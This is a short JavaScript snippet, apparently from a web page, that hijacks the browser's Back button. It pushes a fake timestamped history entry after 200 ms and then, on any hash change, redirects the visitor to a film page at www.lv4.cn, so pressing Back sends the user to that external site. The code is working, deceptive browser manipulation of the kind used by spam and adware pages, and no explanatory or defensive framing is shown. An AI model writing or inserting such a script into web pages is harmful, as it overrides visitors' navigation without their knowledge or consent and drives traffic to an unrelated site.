window.onhashchange = function () {
	location.href = 'http://www.lv4.cn/film/index.html#1487257607040';
};
setTimeout(function (){history.pushState(history.length + 1, "message", "#" + new Date().getTime());}, 200);